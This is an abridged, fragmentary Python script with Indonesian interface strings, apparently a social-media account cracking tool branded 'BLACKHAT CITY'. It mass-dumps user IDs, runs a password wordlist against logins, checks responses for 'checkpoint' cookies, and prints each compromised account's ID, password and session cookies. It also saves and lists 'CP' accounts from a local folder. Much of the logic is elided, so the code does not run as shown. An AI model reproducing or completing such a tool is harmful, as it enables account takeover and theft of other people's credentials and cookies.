...
# COLORS
x = '\33[m' # DEFAULT
k = '\033[93m' # MERAH JAMBU +
h = '\x1b[1;92m' # MERAH JAMBU +
hh = '\033[32m' # MERAH JAMBU -
u = '\033[95m' # MERAH JAMBU
kk = '\033[33m' # MERAH JAMBU -
b = '\33[1;96m' # MERAH JAMBU -
p = '\x1b[0;34m' # MERAH JAMBU +
# Converter Bulan
...
def login_lagi():
	...
	try:
		...
		sue = '# Login Berhasil Bro!'
		suu = mark(sue, style='pink')
...
def result():
	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			gerr = '# HASIL CP ANDA'
			sol().print(mark(gerr, style='pink'))
			cih = 0
			lol = {}
			for isi in vin:
			...
			sol().print(mark(gerr2, style='pink'))
			...
			try:lin = open('CP/'+geh,'r').read()
				...
				sol().print(mark(hehe, style='blue'))
				time.sleep(2)
				back()
			akun = '# LIST AKUN CP ANDA'
			sol().print(mark(akun, style='pink'))
...
def file():
	...
	sol().print(mark(teks, style='pink'))
	my_files = []
	try:
		lis = os.listdir('CP')
		for kt in lis:
	...
	if len(my_files)==0:
		...
		sol().print(mark(teks2, style='pink'))
		geeh = input(x+'['+p+'f'+x+'] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# PILIHAN TIDAK ADA DI MENU'
...
def dump_massal():
	...
	for userr in uid:
		try:
			...
			sol().print(lo, style='cyan')
			exit()
	tot = '# TOTAL 👉 %s ID, BLACKHAT CITY'%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style='blue')
	else:
		tot2 = mark(tot, style='pink')
	sol().print(tot2)
	setting()
...
# WORDLIST
def passwrd():
	ler = '# SYSTEM SEDANG BERJALAN, TEKAN CTRL+Z UNTUK BERHENTI'
	sol().print(mark(ler, style='pink'))
	...
	sol().print(mark(tanya, style='pink'))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='pink')
